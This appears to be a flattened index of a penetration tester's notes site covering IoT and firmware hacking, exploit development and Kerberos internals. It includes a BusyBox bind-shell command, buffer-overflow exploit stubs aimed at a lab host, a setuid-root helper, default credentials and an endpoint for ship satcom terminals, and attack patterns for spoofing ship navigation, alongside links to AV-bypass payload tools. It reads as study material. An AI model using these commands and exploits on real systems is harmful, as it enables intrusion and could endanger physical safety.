http://www.devttys0.com/2013/06/differentiate-encryption-from-compression-using-math/ Repacking Firmware https://github.com/rampageX/firmware-mod-kit/wiki . / extract - firmware . sh example - firmware . bin . / build - formware . sh Busybox Command Injection: https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/ Bind a telnet shell to port 9999: / bin / busybox telnetd - l / bin / sh - p9999 QMUE Run binaries inside a firmware whereis qemu - mips - static cp / etc / example / qemu - mips - static squashfs - root # From squashfs - root chroot . / . / qemu - mips - static bin / ls","title":"Quick Reference"},{"location":"embedded-and-iot/#test-scenarios","text":"Replaying of sensor communication Pair device with controlling application without authorization Using guessable identifiers for linking WiFi and other credentials stored in flash","title":"Test Scenarios"},{"location":"embedded-and-iot/#techniques","text":"Glitching Voltage glitching attacks: https://twitter.com/d_olex/status/1084700474043813895 Side Channel Intel TLBleed: https://www.theregister.co.uk/2018/06/22/intel_tlbleed_key_data_leak/","title":"Techniques"},{"location":"embedded-and-iot/#collections","text":"Searchable FCC ID Database: https://fccid.io/ Command to download all FCC ID documents: https://rehmann.co/blog/command-download-fcc-id-documents/ for i in $ ( seq 3 4200000 ) ; do curl \u2013referer \u2018https://apps.fcc.gov/oetcf/eas/reports/ViewExhibitReport.cfm\u2019 \u2018https://apps.fcc.gov/eas/GetApplicationAttachment.html?calledFromFrame=Y id=\u2019$i -o $i; done","title":"Collections"},{"location":"embedded-and-iot/#protocols","text":"","title":"Protocols"},{"location":"embedded-and-iot/#uart-serial","text":"All clock speeds are set independently of the signal baud rate is the rate at which bits will be transmitted (bits per second). There is one start bit. There is one stop bit (a low voltage cycle). 8 data bits in the middle. 1 parity bit at the end of the data. Settings Number of data bits/number of parity bits/number of stop bits 8/N/1 (8N1) means 8 data bits, No parity bit, and 1 stop bit Common Baud Rates 9600 19200 38400 57600 115200 Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware UART to Root [Pending]: https://exfil.co/2019/02/14/uart-to-root-the-harder-way/","title":"UART / Serial"},{"location":"embedded-and-iot/#spi","text":"MISO - Master In Slave Out - Data flow from the slave units to the master unit MOSI - Master Out Slave In - Data flow from the master unit to the slave units SCLK - The clock signal pin - Rising edge of the clock triggers the level of MISO/MOSI to be read as the current bit by the target device. SS / CS - Slave / Chip Select - Select a device, this pin is grounded, telling the particular device to listen up. VCC / GND Typical https://en.wikipedia.org/wiki/Chip_select Daisy Chained The SPI port of each slave is designed to send out during the second group of clock pulses an exact copy of the data it received during the first group of clock pulses. The whole chain acts as a communication shift register. Daisy chaining is often done with shift registers to provide a bank of inputs or outputs through SPI. Each slave copies input to output in the next clock cycle until active low SS line goes high. SPI mode - is the combination of CPOL and CPHA CPOL - Polarity of the clock CPOL=0 is a clock which idles at 0 - Leading edge is a rising edge - Trailing edge is a falling edge CPOL=1 is a clock which idles at 1 - Leading edge is a falling edge - Trailing edge is a rising edge CPHA - Timing of the data bits relative to the clock pulses CPHA=0 - \"out\" side changes the data on the trailing edge of the preceding clock cycle, while the \"in\" side captures the data on (or shortly after) the leading edge of the clock cycle - First bit must be on the MOSI line before the leading clock edge CPHA=1 - \"out\" side changes the data on the leading edge of the current clock cycle, while the \"in\" side captures the data on (or shortly after) the trailing edge of the clock cycle - For the last cycle, the slave holds the MISO line valid until slave select is deasserted. https://en.wikipedia.org/wiki/Serial_Peripheral_Interface","title":"SPI"},{"location":"embedded-and-iot/#i2c","text":"","title":"I2C"},{"location":"embedded-and-iot/#jtag","text":"TDI - Test Data In TDO - Test Data Out - When you daisychain IC\u2019s with JTAG, the TDO of one goes to the TDI of the next, until it loops back to the debug header. TCK - Test Clock - JTAG clock signal, the rising edge triggering a read operation. TCK is not chained, but rather forms a \u2019test clock bus\u2019 along with TMS each IC can see the clock and TMS signals. TMS - Test Mode Select - Read as the clock signal rises, and determines the next state of the internal JTAG controller TRST - Test Reset - An optional pin that can reset the internal test controller, but this isn\u2019t required. Test Access Port (TAP) Controller to handle JTAG commands Minimally 3 registers (instruction register, 2 or more data registers) State-machine that uses the TMS level to decide what to do after each clock cycle TAP controller connects to the boundary cells Boundary Cells can raise/lower a leg\u2019s voltage to influence the behavior of the chip Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware","title":"JTAG"},{"location":"embedded-and-iot/#swd","text":"","title":"SWD"},{"location":"embedded-and-iot/#tools","text":"Glasgow = Bus Pirate + Bus Blaster + Logic Sniffer https://github.com/whitequark/Glasgow https://twitter.com/whitequark/status/985040607864176640 https://twitter.com/marcan42/status/1090564121068593153 Cutdown version of starshipraider: https://github.com/azonenberg/starshipraider OpenWRT USB Storage: https://openwrt.org/docs/guide-user/storage/usb-drives https://openwrt.org/docs/guide-user/additional-software/extroot_configuration https://wiki.openwrt.org/doc/howto/usb.storage https://wiki.openwrt.org/doc/howto/extroot FACT - The Firmware Analysis and Comparison Tool: https://fkie-cad.github.io/FACT_core/ Platform Firmware Auditing Tool: https://github.com/PreOS-Security/fwaudit BIOS - https://github.com/chipsec/chipsec","title":"Tools"},{"location":"embedded-and-iot/#specific","text":"","title":"Specific"},{"location":"embedded-and-iot/#atms","text":"References: ATM LOGIC ATTACKS: SCENARIOS: https://www.ptsecurity.com/upload/corporate/ww-en/analytics/ATM-Vulnerabilities-2018-eng.pdf","title":"ATMs"},{"location":"embedded-and-iot/#automobile","text":"Tools: canalyzat0r: https://amp.kitploit.com/2019/02/canalyzat0r-security-analysis-toolkit.html?amp=1 m=1 References: Automobile Hacking, Part 1: The CAN Protocol: https://www.hackers-arise.com/single-post/2017/08/04/Automobile-Hacking-Part-1-The-CAN-Protocol Automobile Hacking, Part 2: The can-utils or SocketCAN: https://www.hackers-arise.com/single-post/2017/08/08/Automobile-Hacking-Part-2-The-can-utils-or-SocketCAN Automobile Hacking, Part 3: Metasploit for Car Hacking: https://www.hackers-arise.com/single-post/2017/10/19/Automobile-Hacking-Part-3-Metasploit-for-Car-Hacking Automobile Hacking, Part 4: How to Hack the Keyless Entry System: https://www.hackers-arise.com/single-post/2018/12/05/Automobile-Hacking-Part-4-How-to-Hack-the-Keyless-Entry-System Awesome Vehicle Security: https://github.com/jaredthecoder/awesome-vehicle-security https://twitter.com/0xcharlie/status/1014892446495305733","title":"Automobile"},{"location":"embedded-and-iot/#bluetooth","text":"References: A Bluetooth low energy capture the flag: https://github.com/hackgnar/ble_ctf My notes on Hacking BLE \u2013 list of resources: https://www.davidsopas.com/my-notes-on-hacking-ble-list-of-resources/","title":"Bluetooth"},{"location":"embedded-and-iot/#cameras","text":"Tools: Pentax Hacker Development Kit: https://github.com/i-am-shodan/PHDK https://www.dropbox.com/s/ogez7sb4b0cw92g/hacking_pentax_k30.pdf Canon Hack Development Kit: http://chdk.wikia.com/wiki/CHDK","title":"Cameras"},{"location":"embedded-and-iot/#locks","text":"**References: ** How to open a Tapplock over BLE in under two seconds: https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/","title":"Locks"},{"location":"embedded-and-iot/#printers","text":"Discovery: Windows SharpPrinter - Discover Printers: https://github.com/rvrsh3ll/SharpPrinter ListNetworks - Enumerate all visible network printers in local network: https://github.com/vinifr/-ListNetworks Linux Praeda - Automated printer data harvesting tool: http://h.foofus.net/?page_id=218 Exploitation: PRET - Printer Exploitation Toolkit: https://github.com/RUB-NDS/PRET praedasploit - https://github.com/MooseDojo/praedasploit Attack Patterns: Plunder Pillage Print: https://hackinparis.com/data/slides/2014/DeralHeilandandPeterArzamendi.pdf LDAP/SMB/SMTP Pass-Back-Attack: http://foofus.net/goons/percx/praeda/pass-back-attack.pdf LDAP - power address book functionality SMB - saving scans to file shares SMTP - scan to email Export configuration and look for credentials LDAP traffic is unencrypted (usually), can MITM Guides: An Introduction to Printer Exploitation: https://0x00sec.org/t/an-introduction-to-printer-exploitation/3565","title":"Printers"},{"location":"embedded-and-iot/#ships","text":"Shodan Searches: org:\"Inmarsat Solutions US\" Login for Globe wireless title:\"sailor 900\" Sat antenna details Exploit: https://www.exploit-db.com/exploits/35932 Default credentials: admin/1234 html:commbox KVH CommBox terminals Vessel name / network structure leaked \"Show Users\" link (or can request the content by appending /rest.php?action=QCgetActiveUsers) **Tools: ** Vuln Ship Tracker: https://ptp-shiptracker.herokuapp.com/ Terms: ECDIS are the electronic chart systems that are needed to navigate. AIS transceiver - system that ships use to avoid colliding with each other. NMEA 0183 messages Ethernet and serial networks are often \u2018bridged\u2019 at several points (GPS,satcom terminal, ECDIS) OT systems are used to control the steering gear, engines, ballast pumps and lots more. They communicate using NMEA 0183 messages. No message authentication, encryption or validation (only 2 byte XOR checksum) Attack Patterns: Spoof the ECDIS using the vulnerable config interface, 'grow' the ship and 'jump' it in to the shipping lanes. Other ships AIS will alert the ships captain to a collision scenario MitM and change NMEA 0183 messages to read differently Ex: change the rudder command by modifying a GPS autopilot command References: Summarized References: https://www.pentestpartners.com/security-blog/osint-from-ship-satcoms/ https://www.pentestpartners.com/security-blog/hacking-tracking-stealing-and-sinking-ships/","title":"Ships"},{"location":"embedded-and-iot/#uefi","text":"References: UEFI_EXPLOITATION_MASSES_FINAL: https://github.com/eclypsium/Publications/blob/master/2018/DEFCON26/DC26_UEFI_EXPLOITATION_MASSES_FINAL.pdf Tools: EDK II Project - A modern, feature-rich, cross-platform firmware development environment for the UEFI and PI specifications from www.uefi.org : https://github.com/tianocore/edk2 RaspberryPiPkg - 64-bit Tiano Core UEFI for the Raspberry Pi 3 (with devices, Linux, NetBSD, FreeBSD and Windows on Arm!): https://github.com/andreiw/RaspberryPiPkg uefi-firmware-parser - Parse BIOS/Intel ME/UEFI firmware related structures: Volumes, FileSystems, Files, etc: https://github.com/theopolis/uefi-firmware-parser","title":"UEFI"},{"location":"embedded-and-iot/#references","text":"","title":"References"},{"location":"embedded-and-iot/#new-references","text":"Twinkly Twinkly Little Star: https://labs.mwrinfosecurity.com/blog/twinkly-twinkly-little-star search for Xiaomi scooters lock unlock the devices: https://github.com/rani-i/Mi365Locker Mass play any YouTube video, terminate apps and rename Chromecast device(s) obtained from Shodan.io: https://github.com/649/Crashcast-Exploit Project Alias is an open-source parasite to train custom wake-up names for smart home devices while disturbing their built-in microphone: https://github.com/bjoernkarmann/project_alias 35C3 - Modchips of the State: https://www.youtube.com/watch?v=C7H3V7tkxeA (BNC backdoor designed to be inserted into a resistor sitting between the SPI flash and the BNC chip) Rooting the FireTV Cube and Pendant with FireFU: https://blog.exploitee.rs/2018/rooting-the-firetv-cube-and-pendant-with-firefu/ Thunderclap https://twitter.com/marcan42/status/1100655030711939072","title":"New References"},{"location":"embedded-and-iot/#summarized-references","text":"https://limitedresults.com/2019/01/pwn-the-lifx-mini-white/","title":"Summarized References"},{"location":"exploits_and_shellcoding/","text":"Quick Reference Hexdump (python format): hexdump - v - e \\\\ x 1/1 %02x example . exe Print hex encoded string in text: printf $ ( cat file . txt | tr - d \\n ) Passing binary data as arguments: command $ ( python - c print ... ) Passing binary data as standard input: python - c print ... | command Use file as input and then read from standard input: cat file - | command python - c print ... | cat file - | command Cross compile with - mingw32 i586 - mingw32msvc - gcc a . c wine a . exe export file = shell i686 - w64 - mingw32 - gcc - c - O3 - march = i686 $ file . c i686 - w64 - mingw32 - gcc $ file . o - o $ file . exe - O3 - march = i686 - Wl , - lws2_32 / usr / i686 - w64 - mingw32 / bin / strip $ file . exe Printing shell code ( Bash ) echo - e \\x31\\xc0\\x50\\x68\\x2f... ( Python ) python - c print \\x31\\xc0\\x50\\x68\\x2f... ( Perl ) perl - e print \\x31\\xc0\\x50\\x68\\x2f... Fuzzing Tools American fuzzy lop is a security-oriented fuzzer: http://lcamtuf.coredump.cx/afl/ A fork of AFL for fuzzing Windows binaries: https://github.com/googleprojectzero/winafl Using WinAFL to Fizz WinRar (unacev2.dll): https://research.checkpoint.com/extracting-code-execution-from-winrar/ FoRTE-Research's Fuzzing Benchmarks: https://github.com/FoRTE-Research/FoRTE-FuzzBench Buffer Overflow Introductions Buffer Overflow Attack - Computerphile: https://www.youtube.com/watch?v=1S0aBV-Waeo Binary Exploitation - Buffer Overflow Explained in Detail: https://0xrick.github.io/binary-exploitation/bof1/ Tools - Detection / Testing: - Program to detect the existence of remote / local stack-based buffer-overflow vulnerabilities (FTP, IMAP, POP3 and SMTP): https://github.com/iricartb/buffer-overflow-vulnerability-services-tester-tool - https://hakin9.org/bovstt-buffer-overflow-vulnerability-services-tester-tool/ Techniques ret2libc Find libc address: \u200b ldd / usr / local / bin / backup Find libc system function: \u200b readelf - s / lib / i386 - linux - gnu / libc . so . 6 | grep system Find libc exit function: \u200b readelf - s / lib / i386 - linux - gnu / libc . so . 6 | grep exit Find libc / bin / sh reference: \u200b strings - a - t x / lib / i386 - linux - gnu / libc . so . 6 | grep / bin / sh Practice https://github.com/justinsteven/dostackbufferoverflowgood vsftpd backdoor: https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html HTB - Octomber: / usr / local / bin / ovrflw Exploit Stubs import struct , subprocess libc = 0xf75e2000 sysOffset = 0x0003a940 sysAddress = libc + sysOffset exitOffset = 0x0002e7b0 exitAddress = libc + exitOffset binsh = libc + 0x0015900b payload = A * 512 payload += struct . pack ( I , sysAddress ) payload += struct . pack ( I , exitAddress ) payload += struct . pack ( I , binsh ) attempts = 0 while True : attempts += 1 print Attempts: + attempts subprocess . call ([ /usr/local/bin/vulnerable-binary , arg1 , arg2 , payload ]) from pwn import * shellcode = payload = A * 28 + p32 ( 0xffffd630 ) + shellcode r = remote ( 10.10.10.34 , 7411 ) print r . recv ( 1024 ) r . sendline ( USER admin ) print r . recv ( 1024 ) r . sendline ( PASS + payload ) r . interactive () Simple SUID Binary #include stdio.h #include stdlib.h #include sys/types.h #include unistd.h int main () { setuid ( 0 ); setgid ( 0 ); system ( id ); return 0 ; } Lateral Movement LATERAL MOVEMENT USING THE MMC20.APPLICATION COM OBJECT: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ LATERAL MOVEMENT VIA DCOM: ROUND 2: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ LATERAL MOVEMENT USING EXCEL.APPLICATION AND DCOM: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/ Lateral Movement Using Outlook\u2019s CreateObject Method and DotNetToJScript: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/ Defense DEP Perform additional checks on memory, to help prevent malicious code from running on a system. Prevent code execution from data pages, by raising an exception, when execution occurs. Windows - Bypass Data Execution Protection (DEP): https://0x00sec.org/t/bypass-data-execution-protection-dep/6988 Linux - Exploit Mitigation Techniques - Data Execution Prevention (DEP): https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634 ASLR Randomizes the base addresses of loaded applications, and DLLs, every time the Operating System is booted. Bypass Windows Exploit Guard ASR - https://github.com/sevagas/WindowsDefender_ASR_Bypass-OffensiveCon2019 LD_PRELOAD Load a custom library and override functions of a program g ++ test . cpp - std = c ++ 11 - shared - o test . so - fPIC # PIC = Position independent code LD_PRELOAD = test . so ldd . / exampleapp Shellcode A small, null-free port binding shellcode for 32-bit versions of Windows: https://code.google.com/archive/p/w32-bind-ngs-shellcode/ Tools Windows SEToolKit \u2019s Powershell alphanumeric shellcode injector to generate a Meterpreter payload that will bypass Windows Defender Shellter - Dynamic shellcode injection tool, and the first truly dynamic PE infector ever created: [Intro] [Pro-features] Search Sploitus - https://sploitus.com/ OS w3challs syscall table - https://w3challs.com/syscalls/ Other Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions: https://github.com/Veil-Framework/Veil References Memorize the 8086 opcodes https://pbs.twimg.com/media/Bhx3cHdCUAIC96Y?format=png name=900x900 https://mobile.twitter.com/nocsi_/status/440358188492148736 Heap Exploitation | Playing with chunks!: https://0x00sec.org/t/heap-exploitation-playing-with-chunks/2055 Heap Exploitation - Fastbin Attack: https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627 Analysis of public exploits or my 1day exploits: https://github.com/externalist/exploit_playground Shellcoding for Linux and Windows Tutorial: http://www.vividmachines.com/shellcode/shellcode.html Voltron is an extensible debugger UI toolkit written in Python: https://github.com/snare/voltron Reverse Shell from an OpenVPN Configuration File: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da Programming EXEC in Many Languages: https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Payloads/exec-system-languages.md Windows Specific Modern Windows Userspace Exploitation: https://media.ccc.de/v/35c3-9660-modern_windows_userspace_exploitation Zero Day Zen Garden: Windows Exploit Development - Part 0 [Dev Setup Advice]: http://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html Zero Day Zen Garden: Windows Exploit Development - Part 1 [Stack Buffer Overflow Intro]: http://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html Zero Day Zen Garden: Windows Exploit Development - Part 2 [JMP to Locate Shellcode]: http://www.shogunlab.com/blog/2017/08/26/zdzg-windows-exploit-2.html Zero Day Zen Garden: Windows Exploit Development - Part 3 [Egghunter to Locate Shellcode]: http://www.shogunlab.com/blog/2017/09/02/zdzg-windows-exploit-3.html Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows]: http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains]: http://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html Persistence Maintaining Access Part 1: Introduction and Metasploit Example: https://www.hackingloops.com/maintaining-access-metasploit/ Return oriented programming (ROP) 64-bit ROP | You rule \u2018em all!: https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937 SROP | Signals, you say? (Sigreturn Oriented Programming): https://0x00sec.org/t/srop-signals-you-say/2890","title":"Exploits and shellcoding"},{"location":"exploits_and_shellcoding/#quick-reference","text":"Hexdump (python format): hexdump - v - e \\\\ x 1/1 %02x example . exe Print hex encoded string in text: printf $ ( cat file . txt | tr - d \\n ) Passing binary data as arguments: command $ ( python - c print ... ) Passing binary data as standard input: python - c print ... | command Use file as input and then read from standard input: cat file - | command python - c print ... | cat file - | command Cross compile with - mingw32 i586 - mingw32msvc - gcc a . c wine a . exe export file = shell i686 - w64 - mingw32 - gcc - c - O3 - march = i686 $ file . c i686 - w64 - mingw32 - gcc $ file . o - o $ file . exe - O3 - march = i686 - Wl , - lws2_32 / usr / i686 - w64 - mingw32 / bin / strip $ file . exe Printing shell code ( Bash ) echo - e \\x31\\xc0\\x50\\x68\\x2f... ( Python ) python - c print \\x31\\xc0\\x50\\x68\\x2f... ( Perl ) perl - e print \\x31\\xc0\\x50\\x68\\x2f...","title":"Quick Reference"},{"location":"exploits_and_shellcoding/#fuzzing","text":"Tools American fuzzy lop is a security-oriented fuzzer: http://lcamtuf.coredump.cx/afl/ A fork of AFL for fuzzing Windows binaries: https://github.com/googleprojectzero/winafl Using WinAFL to Fizz WinRar (unacev2.dll): https://research.checkpoint.com/extracting-code-execution-from-winrar/ FoRTE-Research's Fuzzing Benchmarks: https://github.com/FoRTE-Research/FoRTE-FuzzBench","title":"Fuzzing"},{"location":"exploits_and_shellcoding/#buffer-overflow","text":"Introductions Buffer Overflow Attack - Computerphile: https://www.youtube.com/watch?v=1S0aBV-Waeo Binary Exploitation - Buffer Overflow Explained in Detail: https://0xrick.github.io/binary-exploitation/bof1/ Tools - Detection / Testing: - Program to detect the existence of remote / local stack-based buffer-overflow vulnerabilities (FTP, IMAP, POP3 and SMTP): https://github.com/iricartb/buffer-overflow-vulnerability-services-tester-tool - https://hakin9.org/bovstt-buffer-overflow-vulnerability-services-tester-tool/ Techniques ret2libc Find libc address: \u200b ldd / usr / local / bin / backup Find libc system function: \u200b readelf - s / lib / i386 - linux - gnu / libc . so . 6 | grep system Find libc exit function: \u200b readelf - s / lib / i386 - linux - gnu / libc . so . 6 | grep exit Find libc / bin / sh reference: \u200b strings - a - t x / lib / i386 - linux - gnu / libc . so . 6 | grep / bin / sh Practice https://github.com/justinsteven/dostackbufferoverflowgood vsftpd backdoor: https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html HTB - Octomber: / usr / local / bin / ovrflw Exploit Stubs import struct , subprocess libc = 0xf75e2000 sysOffset = 0x0003a940 sysAddress = libc + sysOffset exitOffset = 0x0002e7b0 exitAddress = libc + exitOffset binsh = libc + 0x0015900b payload = A * 512 payload += struct . pack ( I , sysAddress ) payload += struct . pack ( I , exitAddress ) payload += struct . pack ( I , binsh ) attempts = 0 while True : attempts += 1 print Attempts: + attempts subprocess . call ([ /usr/local/bin/vulnerable-binary , arg1 , arg2 , payload ]) from pwn import * shellcode = payload = A * 28 + p32 ( 0xffffd630 ) + shellcode r = remote ( 10.10.10.34 , 7411 ) print r . recv ( 1024 ) r . sendline ( USER admin ) print r . recv ( 1024 ) r . sendline ( PASS + payload ) r . interactive () Simple SUID Binary #include stdio.h #include stdlib.h #include sys/types.h #include unistd.h int main () { setuid ( 0 ); setgid ( 0 ); system ( id ); return 0 ; }","title":"Buffer Overflow"},{"location":"exploits_and_shellcoding/#lateral-movement","text":"LATERAL MOVEMENT USING THE MMC20.APPLICATION COM OBJECT: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ LATERAL MOVEMENT VIA DCOM: ROUND 2: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/ LATERAL MOVEMENT USING EXCEL.APPLICATION AND DCOM: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/ Lateral Movement Using Outlook\u2019s CreateObject Method and DotNetToJScript: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/","title":"Lateral Movement"},{"location":"exploits_and_shellcoding/#defense","text":"DEP Perform additional checks on memory, to help prevent malicious code from running on a system. Prevent code execution from data pages, by raising an exception, when execution occurs. Windows - Bypass Data Execution Protection (DEP): https://0x00sec.org/t/bypass-data-execution-protection-dep/6988 Linux - Exploit Mitigation Techniques - Data Execution Prevention (DEP): https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634 ASLR Randomizes the base addresses of loaded applications, and DLLs, every time the Operating System is booted. Bypass Windows Exploit Guard ASR - https://github.com/sevagas/WindowsDefender_ASR_Bypass-OffensiveCon2019","title":"Defense"},{"location":"exploits_and_shellcoding/#ld_preload","text":"Load a custom library and override functions of a program g ++ test . cpp - std = c ++ 11 - shared - o test . so - fPIC # PIC = Position independent code LD_PRELOAD = test . so ldd . / exampleapp","title":"LD_PRELOAD"},{"location":"exploits_and_shellcoding/#shellcode","text":"A small, null-free port binding shellcode for 32-bit versions of Windows: https://code.google.com/archive/p/w32-bind-ngs-shellcode/","title":"Shellcode"},{"location":"exploits_and_shellcoding/#tools","text":"Windows SEToolKit \u2019s Powershell alphanumeric shellcode injector to generate a Meterpreter payload that will bypass Windows Defender Shellter - Dynamic shellcode injection tool, and the first truly dynamic PE infector ever created: [Intro] [Pro-features] Search Sploitus - https://sploitus.com/ OS w3challs syscall table - https://w3challs.com/syscalls/ Other Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions: https://github.com/Veil-Framework/Veil","title":"Tools"},{"location":"exploits_and_shellcoding/#references","text":"Memorize the 8086 opcodes https://pbs.twimg.com/media/Bhx3cHdCUAIC96Y?format=png name=900x900 https://mobile.twitter.com/nocsi_/status/440358188492148736 Heap Exploitation | Playing with chunks!: https://0x00sec.org/t/heap-exploitation-playing-with-chunks/2055 Heap Exploitation - Fastbin Attack: https://0x00sec.org/t/heap-exploitation-fastbin-attack/3627 Analysis of public exploits or my 1day exploits: https://github.com/externalist/exploit_playground Shellcoding for Linux and Windows Tutorial: http://www.vividmachines.com/shellcode/shellcode.html Voltron is an extensible debugger UI toolkit written in Python: https://github.com/snare/voltron Reverse Shell from an OpenVPN Configuration File: https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da Programming EXEC in Many Languages: https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Payloads/exec-system-languages.md Windows Specific Modern Windows Userspace Exploitation: https://media.ccc.de/v/35c3-9660-modern_windows_userspace_exploitation Zero Day Zen Garden: Windows Exploit Development - Part 0 [Dev Setup Advice]: http://www.shogunlab.com/blog/2017/08/11/zdzg-windows-exploit-0.html Zero Day Zen Garden: Windows Exploit Development - Part 1 [Stack Buffer Overflow Intro]: http://www.shogunlab.com/blog/2017/08/19/zdzg-windows-exploit-1.html Zero Day Zen Garden: Windows Exploit Development - Part 2 [JMP to Locate Shellcode]: http://www.shogunlab.com/blog/2017/08/26/zdzg-windows-exploit-2.html Zero Day Zen Garden: Windows Exploit Development - Part 3 [Egghunter to Locate Shellcode]: http://www.shogunlab.com/blog/2017/09/02/zdzg-windows-exploit-3.html Zero Day Zen Garden: Windows Exploit Development - Part 4 [Overwriting SEH with Buffer Overflows]: http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html Zero Day Zen Garden: Windows Exploit Development - Part 5 [Return Oriented Programming Chains]: http://www.shogunlab.com/blog/2018/02/11/zdzg-windows-exploit-5.html Persistence Maintaining Access Part 1: Introduction and Metasploit Example: https://www.hackingloops.com/maintaining-access-metasploit/ Return oriented programming (ROP) 64-bit ROP | You rule \u2018em all!: https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937 SROP | Signals, you say? (Sigreturn Oriented Programming): https://0x00sec.org/t/srop-signals-you-say/2890","title":"References"},{"location":"iam-kerberos/","text":"Kerberos Protocol Summary Designed to lessening authentication related packets transmitted in the network Not designed for today's network security Loosing KDC means, security is at total loss Kerberos uses either UDP / 88 or TCP / 88 as transport protocol. Hence Kerberos itself is responsible of encrypting data. Several agents working together: Client or user: who wants to access to the service. AP ( Application Server ) : offers the service required by the user. KDC ( Key Distribution Center ) : main service of Kerberos, responsible of issuing the tickets, installed on the DC (Domain Controller). It is supported by the AS ( Authentication Service ) , which issues the TGTs . Keys: KDC key or krbtgt key : Derivate from krbtgt account NTLM hash. User key : Derivate from user NTLM hash. Service key : Derivate from the NTLM hash of service owner, which can be an user or computer account. Session key : Negotiated between the user and KDC. Service session key : to be use between user and service. Tickets: TGS ( Ticket Granting Service ) : Ticket which user can use to authenticate against a service. It is encrypted with the service key. TGT ( Ticket Granting Ticket ) : Ticket presented to the KDC to request for TGSs. It is encrypted with the KDC key. PAC ( Privilege Attribute Certificate ) is an structure included in almost every ticket. It is possible to services to verify the PAC by communicating with the KDC Messages: KRB_AS_REQ : Used to request the TGT to KDC. KRB_AS_REP : Used to deliver the TGT by KDC. KRB_TGS_REQ : Used to request the TGS to KDC, using the TGT. KRB_TGS_REP : Used to deliver the TGS by KDC. KRB_AP_REQ : Used to authenticate a user against a service, using the TGS. KRB_AP_REP : (Optional) Used by service to identify itself against the user. KRB_ERROR : Message to communicate error conditions. KERB_VERIFY_PAC_REQUEST : AP send message to KDC including the signature of PAC, and verify if it is correct. (not part of Kerberos, but NRPC) Protocol Flow Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png Source: https://www.varonis.com/blog/kerberos-authentication-explained/ Ref: https://www.youtube.com/watch?v=VpBCJ8vS7T0 Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Client - KDC (Pre-Auth) (Kerberos 5+) Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Client constructs an authenticator (request for TGT) containing: Identify information - unencrypted. Timestamp - encrypted using user's password (hash). User's password (hash) is used as symmetric key. When a client sends a request ( AS-REQ ) for a ticket to the Key Distribution Center (KDC) . A timestamp is sent encrypted with user's password hash (also called user's long term key ). [When using SmartCard] [non-DH] Timestamp is signed using public-key and public-key is sent to DC [DH] Timestamp is signed using public-key and public-key and DH parameters are sent to DC If request can be decrypted with user's password hash, And If request's time is within 5 minutes: The KDC creates a Ticket-Granting Ticket (TGT) for the client Special ticket that permits the client to obtain additional Kerberos tickets within the same Kerberos realm. Usually good for 10 hours. Containing: client name IP address timestamp validity period - 10 hours max by default Sends ( AS-REP ) the encrypted TGT + TGS Session Key back to the client User portion (client can decrypt) - Encrypted with user's password (hash), contains: TGS Session Key - Usable to encrypt communication between client and TGS [When using SmartCard] - [non-DH] Encrypted with public-key - [DH] Encrypted with DH info (?) not public-key Server portion (client cannot decrypt) - Encrypted with KDC's secret key ( Domain key / krbtgt account ), contains: TGT - Permits the client to obtain additional tickets (like TGS) which gives permission for specific services. Contains: [Microsoft] Privilege Attribute Certificate (PAC) containing: Username User's RID Group membership PAC is signed with: Target key (for TGT target key is also KDC key) KDC key If TGS Session Key can be decrypted using user's password (hash): Client stores encrypted TGT and decrypted (?) TGS Session Key in Kerberos Tray Always lives in memory Never saved into disk Kerberos Tray can be explored with kerbtray Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Client - Service Authentication TGS - Ticket granting service is a KDC component that issues a service ticket when a client requests connection to a Kerberos service. Client sends following to TGS ( TGS-REQ ) Copy of TGT TGS can decrypt this using KDC's secret key Name of the service Time stamped client ID encrypted with TGS Session Key TGS can decrypt this using user's password (hash) TGS will return ( TGS-REP ): User Portion (User can decrypt) - Encrypted with TGS Session Key Service Session Key Validity time Server Portion / Service Ticket (User cannot decrypt) - Encrypted with service secret key Privilege Attribute Certificate (PAC) 2 HMAC signatures: Target key - Service account's hash (might be 